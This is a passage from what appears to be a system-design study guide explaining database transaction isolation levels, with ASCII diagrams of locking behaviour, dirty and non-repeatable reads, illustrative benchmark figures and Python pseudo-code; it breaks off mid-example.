\u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                                             \u2502\n\u2502                     \u2502  Read        \u2502  Read      \u2502 Repeatable \u2502             \u2502\n\u2502  Isolation Problem  \u2502  Uncommitted \u2502  Committed \u2502 Read       \u2502 Serializable\u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                     \u2502              \u2502            \u2502            \u2502             \u2502\n\u2502  Dirty Read         \u2502     YES      \u2502     NO     \u2502     NO     \u2502     NO      \u2502\n\u2502  (Read uncommitted  \u2502      \u2717       \u2502     \u2713      \u2502     \u2713      \u2502     \u2713       \u2502\n\u2502   data)             \u2502   Allowed    \u2502  Prevented \u2502  Prevented \u2502  Prevented  \u2502\n\u2502                     \u2502              \u2502            \u2502            \u2502             \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                     \u2502              \u2502            \u2502            \u2502             \u2502\n\u2502  Non-Repeatable     \u2502     YES      \u2502    YES     \u2502     NO     \u2502     NO      \u2502\n\u2502  Read               \u2502      \u2717       \u2502     \u2717      \u2502     \u2713      \u2502     \u2713       \u2502\n\u2502  (Same row,         \u2502   Allowed    \u2502  Allowed   \u2502  Prevented \u2502  Prevented  \u2502\n\u2502   different value)  \u2502              \u2502            \u2502            \u2502             \u2502\n\u2502                     \u2502              \u2502            \u2502            \u2502             \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                     \u2502              \u2502            \u2502            \u2502             \u2502\n\u2502  Phantom Read       \u2502     YES      \u2502    YES     \u2502    YES     \u2502     NO      \u2502\n\u2502  (Different row     \u2502      \u2717       \u2502     \u2717      \u2502     \u2717      \u2502     \u2713       \u2502\n\u2502   count)            \u2502   Allowed    \u2502  Allowed   \u2502  Allowed   \u2502  Prevented  \u2502\n\u2502                     \u2502              \u2502            \u2502            \u2502             \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                                             \u2502\n\u2502  Legend:                                                                    \u2502\n\u2502  \u2022 YES / \u2717 / Allowed    = Problem CAN occur at this isolation level        \u2502\n\u2502  \u2022 NO  / \u2713 / Prevented  = Problem CANNOT occur (prevented by locks/MVCC)   \u2502\n\u2502                                                                             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Detailed Breakdown:</p> Isolation Level Dirty Read Non-Repeatable Read Phantom Read Locking Strategy Read Uncommitted \u2717 YES \u2717 YES \u2717 YES No read locks Read Committed \u2713 NO \u2717 YES \u2717 YES Short-duration read locks Repeatable Read \u2713 NO \u2713 NO \u2717 YES Long-duration read locks (rows only) Serializable \u2713 NO \u2713 NO \u2713 NO Long-duration locks + range locks <p>Visual Progression:</p> <pre><code>Isolation Level Strength (Weakest \u2192 Strongest):\n\nREAD UNCOMMITTED\n\u251c\u2500 Prevents: Nothing\n\u251c\u2500 Allows: Dirty Read \u2717, Non-Repeatable Read \u2717, Phantom Read \u2717\n\u2514\u2500 Use: Dashboards, approximate analytics\n\nREAD COMMITTED\n\u251c\u2500 Prevents: Dirty Read \u2713\n\u251c\u2500 Allows: Non-Repeatable Read \u2717, Phantom Read \u2717\n\u2514\u2500 Use: Most OLTP applications (DEFAULT)\n\nREPEATABLE READ\n\u251c\u2500 Prevents: Dirty Read \u2713, Non-Repeatable Read \u2713\n\u251c\u2500 Allows: Phantom Read \u2717\n\u2514\u2500 Use: Financial reports, complex transactions\n\nSERIALIZABLE\n\u251c\u2500 Prevents: Dirty Read \u2713, Non-Repeatable Read \u2713, Phantom Read \u2713\n\u251c\u2500 Allows: Nothing (full isolation)\n\u2514\u2500 Use: Critical operations requiring complete consistency\n</code></pre> <p>Key Takeaways:</p> <ol> <li>Each higher level prevents more problems:</li> <li>Read Uncommitted \u2192 Read Committed: Prevents dirty reads</li> <li>Read Committed \u2192 Repeatable Read: Prevents non-repeatable reads</li> <li> <p>Repeatable Read \u2192 Serializable: Prevents phantom reads</p> </li> <li> <p>Trade-off: Consistency vs Performance:    <pre><code>Read Uncommitted:  \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 Performance (12/10)\n                   \u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591 Consistency (0/10)\n\nRead Committed:    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591 Performance (10/10)\n                   \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591\u2591\u2591 Consistency (8/10) \u2190 Best balance!\n\nRepeatable Read:   \u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591\u2591\u2591\u2591\u2591 Performance (6/10)\n                   \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 Consistency (10/10)\n\nSerializable:      \u2588\u2588\u2588\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591 Performance (3/10)\n                   \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 Consistency (12/10)\n</code></pre></p> </li> <li> <p>Default Isolation Levels by Database:</p> </li> <li>PostgreSQL: Read Committed (can use Serializable with SSI)</li> <li>MySQL InnoDB: Repeatable Read (MVCC-based)</li> <li>Oracle: Read Committed (MVCC-based)</li> <li>SQL Server: Read Committed (can enable MVCC with snapshot isolation)</li> <li> <p>SQLite: Serializable (by default, due to file-level locking)</p> </li> <li> <p>Choosing the Right Level:    <pre><code>Use Case                          \u2192 Recommended Level\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nMonitoring dashboard              \u2192 Read Uncommitted\nE-commerce checkout               \u2192 Read Committed\nBanking transfer                  \u2192 Read Committed (with explicit locks)\nFinancial report generation       \u2192 Repeatable Read\nInventory management (critical)   \u2192 Serializable\nAnalytics (approximate OK)        \u2192 Read Uncommitted\nWeb application (general)         \u2192 Read Committed\nBatch processing with aggregates  \u2192 Repeatable Read or Serializable\n</code></pre></p> </li> </ol> <p>Real-World Example Comparison:</p> <pre><code># Scenario: Reading account balance twice in a transaction\n\n# READ UNCOMMITTED\ndef read_uncommitted_example(db):\n    db.set_isolation_level(\"READ UNCOMMITTED\")\n    db.begin()\n    balance1 = db.execute(\"SELECT balance FROM accounts WHERE id = 1\").fetchone()[0]\n    # \u2192 Could be uncommitted (dirty read) \u2717\n    time.sleep(2)\n    balance2 = db.execute(\"SELECT balance FROM accounts WHERE id = 1\").fetchone()[0]\n    # \u2192 Could be different (non-repeatable read) \u2717\n    # \u2192 Could include phantom rows in COUNT queries \u2717\n    db.commit()\n\n\n# READ COMMITTED\ndef read_committed_example(db):\n    db.set_isolation_level(\"READ COMMITTED\")\n    db.begin()\n    balance1 = db.execute(\"SELECT balance FROM accounts WHERE id = 1\").fetchone()[0]\n    # \u2192 Always committed \u2713 (no dirty read)\n    time.sleep(2)\n    balance2 = db.execute(\"SELECT balance FROM accounts WHERE id = 1\").fetchone()[0]\n    # \u2192 Could be different (non-repeatable read) \u2717\n    # \u2192 Could include phantom rows in COUNT queries \u2717\n    db.commit()\n\n\n# REPEATABLE READ\ndef repeatable_read_example(db):\n    db.set_isolation_level(\"REPEATABLE READ\")\n    db.begin()\n    balance1 = db.execute(\"SELECT balance FROM accounts WHERE id = 1\").fetchone()[0]\n    # \u2192 Always committed \u2713 (no dirty read)\n    time.sleep(2)\n    balance2 = db.execute(\"SELECT balance FROM accounts WHERE id = 1\").fetchone()[0]\n    # \u2192 Guaranteed same value \u2713 (no non-repeatable read)\n    # \u2192 But COUNT queries could change (phantom read) \u2717\n    db.commit()\n\n\n# SERIALIZABLE\ndef serializable_example(db):\n    db.set_isolation_level(\"SERIALIZABLE\")\n    db.begin()\n    balance1 = db.execute(\"SELECT balance FROM accounts WHERE id = 1\").fetchone()[0]\n    # \u2192 Always committed \u2713 (no dirty read)\n    time.sleep(2)\n    balance2 = db.execute(\"SELECT balance FROM accounts WHERE id = 1\").fetchone()[0]\n    # \u2192 Guaranteed same value \u2713 (no non-repeatable read)\n    count = db.execute(\"SELECT COUNT(*) FROM accounts WHERE balance &gt; 1000\").fetchone()[0]\n    # \u2192 Guaranteed consistent \u2713 (no phantom read)\n    db.commit()\n</code></pre> <p>Performance Impact:</p> <pre><code>Benchmark: 1000 concurrent transactions reading/writing same data\n\nIsolation Level      Throughput    Avg Latency    Deadlocks    Blocked Txns\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nRead Uncommitted     1000 tx/sec   10 ms          0            0%\nRead Committed       850 tx/sec    15 ms          0-1          5%\nRepeatable Read      600 tx/sec    25 ms          2-5          15%\nSerializable         300 tx/sec    50 ms          10-20        40%\n\nNote: Actual numbers vary by workload, database, and MVCC implementation\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#32-read-committed","title":"3.2 Read Committed","text":"<p>Description:</p> <p>The most widely used isolation level and the default in most production databases. At this level, a transaction can only read data that has been committed by other transactions. This prevents dirty reads but still allows non-repeatable reads and phantom reads.</p> <p>Key Characteristics:</p> <ul> <li>No dirty reads - only committed data is visible</li> <li>Short-duration read locks - acquired and released immediately after each read</li> <li>Long-duration write locks - held until transaction commits</li> <li>Good balance - prevents most common errors while maintaining concurrency</li> <li>Default in PostgreSQL, Oracle, SQL Server - battle-tested for production workloads</li> <li>Still allows non-repeatable and phantom reads - data can change between reads</li> </ul> <p>Locking Strategy:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502      READ COMMITTED - Locking Strategy                  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 READ Operations:                                        \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Acquires SHARED READ LOCKS               \u2502         \u2502\n\u2502 \u2502 \u2022 Holds lock ONLY during read operation    \u2502         \u2502\n\u2502 \u2502 \u2022 Releases lock IMMEDIATELY after read     \u2502         \u2502\n\u2502 \u2502 \u2022 Blocks if row has uncommitted changes    \u2502         \u2502\n\u2502 \u2502 \u2022 Waits for write locks to be released     \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 WRITE Operations:                                       \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Acquires EXCLUSIVE WRITE LOCKS           \u2502         \u2502\n\u2502 \u2502 \u2022 Holds locks until COMMIT or ROLLBACK     \u2502         \u2502\n\u2502 \u2502 \u2022 Blocks conflicting reads and writes      \u2502         \u2502\n\u2502 \u2502 \u2022 Prevents lost updates                    \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 Lock Compatibility Matrix:                              \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                   \u2502\n\u2502 \u2502            \u2502  Read    \u2502  Write   \u2502                   \u2502\n\u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524                   \u2502\n\u2502 \u2502 Read       \u2502   \u2713      \u2502    \u2717     \u2502 (wait)            \u2502\n\u2502 \u2502 Write      \u2502   \u2717      \u2502    \u2717     \u2502 (wait)            \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                   \u2502\n\u2502                                                         \u2502\n\u2502 Lock Duration Timeline:                                 \u2502\n\u2502                                                         \u2502\n\u2502 READ:                                                   \u2502\n\u2502 \u251c\u2500 Acquire shared lock                                 \u2502\n\u2502 \u251c\u2500 Read data                                           \u2502\n\u2502 \u2514\u2500 Release lock \u2190 SHORT DURATION                       \u2502\n\u2502                                                         \u2502\n\u2502 WRITE:                                                  \u2502\n\u2502 \u251c\u2500 Acquire exclusive lock                              \u2502\n\u2502 \u251c\u2500 Modify data                                         \u2502\n\u2502 \u251c\u2500 ... (transaction continues)                         \u2502\n\u2502 \u2514\u2500 Release on COMMIT \u2190 LONG DURATION                   \u2502\n\u2502                                                         \u2502\n\u2502 Implementation Variants:                                \u2502\n\u2502                                                         \u2502\n\u2502 PostgreSQL:                                             \u2502\n\u2502 \u2022 Uses MVCC (Multi-Version Concurrency Control)        \u2502\n\u2502 \u2022 Readers don't block writers                          \u2502\n\u2502 \u2022 Writers don't block readers                          \u2502\n\u2502 \u2022 Each transaction sees snapshot of committed data     \u2502\n\u2502                                                         \u2502\n\u2502 Oracle:                                                 \u2502\n\u2502 \u2022 Default isolation level                              \u2502\n\u2502 \u2022 MVCC-based with undo segments                        \u2502\n\u2502 \u2022 Statement-level read consistency                     \u2502\n\u2502                                                         \u2502\n\u2502 SQL Server:                                             \u2502\n\u2502 \u2022 Traditional locking (not MVCC by default)            \u2502\n\u2502 \u2022 Readers acquire and release shared locks             \u2502\n\u2502 \u2022 Can enable MVCC with READ_COMMITTED_SNAPSHOT         \u2502\n\u2502                                                         \u2502\n\u2502 MySQL InnoDB:                                           \u2502\n\u2502 \u2022 Uses MVCC                                            \u2502\n\u2502 \u2022 Consistent non-locking reads                         \u2502\n\u2502 \u2022 Each read sees snapshot at query start               \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>How Locking Works:</p> <pre><code>Scenario: Transaction reads data being modified\n\nTimeline:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nT1: BEGIN\nT1: UPDATE account SET balance = 500 WHERE id = 1\n    \u2193\n    Acquires EXCLUSIVE WRITE LOCK on row id=1\n    [Row 1: balance=500, WRITE LOCKED by T1, uncommitted]\n\nT2: BEGIN\nT2: SELECT balance FROM account WHERE id = 1\n    \u2193\n    Tries to acquire SHARED READ LOCK\n    \u2193\n    BLOCKED! (row has uncommitted write lock)\n    \u2193\n    [T2 WAITS...]\n\nT1: COMMIT\n    \u2193\n    Releases EXCLUSIVE WRITE LOCK\n    [Row 1: balance=500, COMMITTED, unlocked]\n\nT2: [UNBLOCKED]\n    \u2193\n    Acquires SHARED READ LOCK\n    Reads committed value: 500 \u2713\n    Immediately releases SHARED READ LOCK\n    \u2193\n    (lock released after read!)\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nKey Point: T2 WAITED for T1 to commit (prevented dirty read)\nBut: T2 released lock after read (allows non-repeatable read)\n</code></pre> <p>Why Non-Repeatable Reads Still Happen:</p> <pre><code>T1: BEGIN\nT1: SELECT balance FROM account WHERE id = 1\n    \u2193\n    Acquires SHARED READ LOCK\n    Reads: balance = 1000\n    Releases SHARED READ LOCK \u2190 Lock released!\n\nT2: BEGIN\nT2: UPDATE account SET balance = 500 WHERE id = 1\n    \u2193\n    Acquires EXCLUSIVE WRITE LOCK (allowed - no locks on row!)\n    Updates balance to 500\nT2: COMMIT\n    Releases EXCLUSIVE WRITE LOCK\n\nT1: SELECT balance FROM account WHERE id = 1\n    \u2193\n    Acquires SHARED READ LOCK (fresh lock)\n    Reads: balance = 500 \u2190 DIFFERENT VALUE!\n    Releases SHARED READ LOCK\n\nResult: Non-repeatable read (same query, different result)\nCause: T1 didn't hold lock between reads\n</code></pre> <p>How it Works:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502            READ COMMITTED - How it Works                \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  \u2022 Acquires read locks, releases immediately after read \u2502\n\u2502  \u2022 Only reads committed data                            \u2502\n\u2502  \u2022 Writes acquire locks until transaction commits       \u2502\n\u2502  \u2022 Multiple reads may see different values              \u2502\n\u2502                                                         \u2502\n\u2502  Transaction 1          Database          Transaction 2 \u2502\n\u2502                                                         \u2502\n\u2502  UPDATE x = 10          [x = 10]                        \u2502\n\u2502  (not committed)        (uncommitted)                   \u2502\n\u2502                            \u2193                            \u2502\n\u2502                            X  BLOCKS \u2192 READ x           \u2502\n\u2502                         (must wait)                     \u2502\n\u2502  COMMIT                 [x = 10]                        \u2502\n\u2502                         (committed)                     \u2502\n\u2502                            \u2193                            \u2502\n\u2502                            \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 READ x = 10 \u2713    \u2502\n\u2502                                       (reads committed) \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Visual Diagram:</p> <pre><code>READ COMMITTED - Prevents Dirty Reads:\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 T1: BEGIN                                            \u2502\n\u2502 T1: UPDATE balance = 900                             \u2502\n\u2502     \u2193 (uncommitted)                                  \u2502\n\u2502     [balance = 900] \u2190 UNCOMMITTED                    \u2502\n\u2502         \u2551                                            \u2502\n\u2502         \u2551\u2550\u2550\u2550&gt; T2: BEGIN                              \u2502\n\u2502         \u2551     T2: READ balance                       \u2502\n\u2502         \u2551     \u2193 BLOCKED! (waits for T1)              \u2502\n\u2502         \u2551     [waiting...]                           \u2502\n\u2502     \u2193   \u2551                                            \u2502\n\u2502 T1: COMMIT                                           \u2502\n\u2502     [balance = 900] \u2190 NOW COMMITTED                  \u2502\n\u2502         \u2551                                            \u2502\n\u2502         \u255a\u2550\u2550\u2550&gt; T2: READ balance = 900 \u2713               \u2502\n\u2502               (reads committed value)                \u2502\n\u2502               T2: COMMIT                             \u2502\n\u2502                                                      \u2502\n\u2502 No dirty read! T2 waited for commit.                 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nBut allows Non-Repeatable Reads:\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 T1: READ balance = 1000 (first read)                 \u2502\n\u2502     \u2193                                                \u2502\n\u2502     [balance = 1000]                                 \u2502\n\u2502         \u2193                                            \u2502\n\u2502         \u2514\u2500\u2500\u2192 T2: UPDATE balance = 500                \u2502\n\u2502              T2: COMMIT                              \u2502\n\u2502     [balance = 500] \u2190 CHANGED!                       \u2502\n\u2502     \u2193                                                \u2502\n\u2502 T1: READ balance = 500 (second read)                 \u2502\n\u2502     DIFFERENT! \u2190 NON-REPEATABLE READ                 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nProblems Allowed:\n\u2713 Dirty Read        - NO (Prevented!)\n\u2717 Non-Repeatable    - YES\n\u2717 Phantom Read      - YES\n</code></pre> <p>Pseudo Code:</p> <pre><code># READ COMMITTED Example\n\ndef read_committed_transaction(db):\n    \"\"\"Demonstrates READ COMMITTED behavior\"\"\"\n    db.set_isolation_level(\"READ COMMITTED\")\n    db.begin()\n\n    # Read 1: Gets committed value\n    balance1 = db.execute(\n        \"SELECT balance FROM 